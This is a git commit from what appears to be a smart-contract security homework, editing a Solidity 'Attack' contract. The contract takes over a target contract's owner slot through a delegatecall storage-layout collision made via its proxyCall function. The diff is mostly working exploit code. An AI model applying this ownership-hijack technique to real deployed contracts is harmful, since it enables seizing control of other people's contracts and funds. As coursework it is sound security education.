6b9c76ba4361d1033f76afeada250c33c0a73437
blackcat <cosmos.lighte@gmail.com>
2024-03-27 22:23:11 +0800

    black cat scores 100!

--- hw1/src/Delegation/Delegation.sol
+++ hw1/src/Delegation/Delegation.sol
@@ -1,3 +1,4 @@
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 interface ID31eg4t3 {
@@ -8,19 +9,30 @@ interface ID31eg4t3 {
 contract Attack {
     address internal immutable victim;
 
+    // We also need to declare state variables that match the storage layout of D31eg4t3
+    uint256 internal placeholder0; // matches var0 in D31eg4t3
+    uint8 internal placeholder1;   // matches var1 in D31eg4t3
+    string internal placeholder2;  // matches var2 in D31eg4t3
+    address internal placeholder3; // matches var3 in D31eg4t3
+    uint8 internal placeholder4;   // matches var4 in D31eg4t3
+    address public owner;          // this should align with owner variable in D31eg4t3
+
     constructor(address addr) payable {
         victim = addr;
+        owner = msg.sender; // Initialize owner as the deployer; necessary due to Solidity's checks on uninitialized storage
+    }
+
+    function changeOwner(address newOwner) external {
+        // This function will overwrite the owner storage slot in the victim contract if called with delegatecall
+        owner = newOwner;
     }
 
     function exploit() external {
-        // Prepare data for delegatecall
-        bytes memory data = abi.encodeWithSignature("changeResult()");
-
-        // Perform delegatecall to the victim contract
-        (bool success, ) = victim.delegatecall(data);
-        require(success, "Delegatecall failed");
-
-        // Change owner of the victim contract to the attacker's address
-        ID31eg4t3(victim).proxyCall(abi.encodeWithSignature("changeOwner(address)", msg.sender));
+        // Craft the calldata for the changeOwner function
+        bytes memory data = abi.encodeWithSignature("changeOwner(address)", msg.sender);
+        
+        // Make the proxy call to delegatecall to the victim contract
+        (bool success, ) = victim.call(abi.encodeWithSignature("proxyCall(bytes)", data));
+        require(success, "Exploit failed");
     }
 }
